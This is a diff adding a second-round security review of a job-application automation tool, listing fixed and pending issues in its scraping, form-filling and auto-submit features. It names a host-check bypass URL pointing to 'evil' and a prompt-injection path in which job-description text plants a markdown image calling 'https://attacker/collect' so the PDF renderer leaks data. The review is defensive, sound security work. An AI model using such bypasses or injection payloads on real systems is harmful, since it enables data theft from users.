@@ -771,3 +771,82 @@ flip — the Workday blind-fill — is fixed. The rest are correctly-identified
 hardening items whose blast radius is bounded by "operator reviews before
 acting"; schedule them with the full-mode / any-unattended-mode work, not
 before.
+
+---
+
+# Section S — Red-Team Review, Round 2 (2026-07-06, codex restored)
+
+Codex quota was restored and it ran the full read-only audit that R.1/R.2
+missed (that pass was agy-only). Codex was sharper on security and caught
+several real items agy did not. Cross-validated across codex + agy + host.
+
+## S.1 Fixed in this pass (low-risk, high-confidence, or confirmed-by-data)
+
+- **WebSearch/discovery results silently dropped** (codex P1, host-confirmed) —
+  `scan_via_websearch` and `scan_discovery_channels` build jobs with
+  `location=""`, and the Canada filter treats empty location as non-Canadian,
+  so tier-2/3 discovery (incl. the new immigration channels) returned nothing
+  in default mode. Fix: `_passes_canada_filter` keeps unknown locations;
+  discovery-channel jobs now carry the queried location. Functional bug that
+  neutered a feature added earlier the same day.
+- **Tracker pipe-injection** (codex P1, **confirmed by real data** — the 3
+  malformed rows fixed earlier this session were exactly this) — a `|` in a
+  scraped title shifted columns. Fix: `_cell` escapes `|`/newlines on write;
+  `parse_tracker_line` splits on unescaped pipes and unescapes, so cells
+  round-trip.
+- **`bool("false")` type confusion** (codex P1) — an LLM emitting the string
+  `"false"` for `generate_pdf` would render a PDF (truthy string). Fix:
+  `_coerce_bool` handles string forms.
+
+## S.2 Confirmed, NOT yet fixed — auto-submit hardening (schedule before enabling)
+
+Codex verdict: DO_NOT_MERGE, disable auto-submit until fixed. Auto-submit is
+OFF by default (needs `--auto-submit` + profile flag + `mode==full`), so the
+attended fill-only/manual-submit workflow the operator actually uses is
+unaffected. But these must land before auto-submit is ever switched on —
+especially relevant now that mode is flipping to full:
+
+- **[P0] Workday host-check is a substring** — `"myworkdayjobs.com" in url`
+  matches `https://myworkdayjobs.com@evil/`. Combined with fail-open
+  (`required_empty`/review-gate return empty on parse exceptions), auto-submit
+  could fire on the wrong/broken page. Fix: parse the host, allowlist it,
+  require an explicit Review-step marker, and fail CLOSED on every parser
+  exception.
+- **[P0] LinkedIn auto-submits with guessed legal answers** — same flag reaches
+  LinkedIn Easy Apply; authorization="Yes"/sponsorship="No"/experience="2" are
+  guessed. Legal/sponsorship/experience questions must require per-application
+  human confirmation before any auto-submit.
+- **[P1] Click ≠ confirmed** — `auto_submit.confirmed` and the `Applied` row are
+  emitted after the click even if the post-submit load check fails. Record
+  `SubmissionUnknown` + evidence unless a positive success marker is seen.
+- **[P1] Missing/malformed profile → placeholder facts** — profile_loader
+  returns "Example Candidate" identity + example experience/education on load
+  failure, which Workday fillers consume (broader than the embedded-fallback
+  fixed in R.1). Missing/invalid candidate data must abort fill + auto-submit.
+
+## S.3 Confirmed, deferred (bounded blast radius on an attended local tool)
+
+- **[P1] Prompt injection incl. PDF-renderer network exfil** — a JD-injected
+  `![](https://attacker/collect?…)` in generated CV markdown → Playwright PDF
+  renderer fetches it. Block all renderer network requests; validate LLM JSON
+  with strict schemas; recompute the score gate locally. (Extends R.2's prompt
+  note with a concrete exfil path.)
+- **[P1] Dashboard stored-XSS + CDN Chart.js** (`dashboard_html.py`) — tracker
+  values via `innerHTML`, JSON inlined in a script, CDN dep. Local-only render
+  but real: bundle locally, `textContent`, escape `<`, add CSP.
+- **[P1] Email spoofing / status regression** — no SPF/DKIM check; an old
+  "application received" can regress Interview→Applied. Enforce monotonic
+  transitions + sender-domain mapping; require review for Offer/Rejection.
+- **[P1] Sensitive artifacts `0644`; Slack webhook URL in stored exception
+  text** — tighten to `0700`/`0600`, redact webhook URLs from logs.
+- **[P2] Browser-profile / IPC can target the wrong application**; **[P2] JSONL
+  + usage counters not process-safe**; **[P2] lockfile not enforced on install**
+  (`uv sync --frozen`); **[P3] host-local clock vs configured TZ**; **[P3] comp
+  parser concatenates digits** (`80K–100K`→`80100`).
+
+## S.4 Verdict
+
+Fill-only/manual-submit (the operator's real workflow) is sound. Auto-submit
+carries genuine P0s and must stay OFF until S.2 lands — this is now a gating
+item for the full-mode switch, since flipping to full is what makes
+auto-submit reachable at all.
